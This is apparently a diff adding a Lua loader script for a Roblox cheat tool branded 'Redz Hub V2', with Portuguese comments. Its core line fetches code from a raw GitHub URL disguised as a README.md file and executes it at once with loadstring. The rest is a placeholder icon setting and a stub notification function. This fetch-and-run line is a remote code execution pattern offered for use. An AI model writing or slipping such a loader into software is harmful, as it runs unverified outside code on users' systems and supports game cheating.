@@ -1,0 +1,24 @@
+-- Carrega o script principal
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredztlredz1-droid/Refz/873edaad256261352a93299d1142157e770d6783/README.md"))()
+end)
+
+if not success then
+    warn("Erro ao carregar o script: " .. tostring(err))
+end
+
+-- Define o ícone (certifique-se de que 'icon' está definido anteriormente)
+if icon then
+    icon.Image = "rbxassetid://133032272724948"
+end
+
+-- Função de notificação lateral (exemplo)
+local function SideNotify(title, message, duration)
+    -- Implementação da notificação
+    print(string.format("[%s] %s", title, message))
+    -- Adicione aqui a lógica visual da notificação
+    task.wait(duration)
+end
+
+-- Exemplo de uso
+SideNotify("Redz Hub V2", "Nova interface e melhorias de desempenho!", 5)
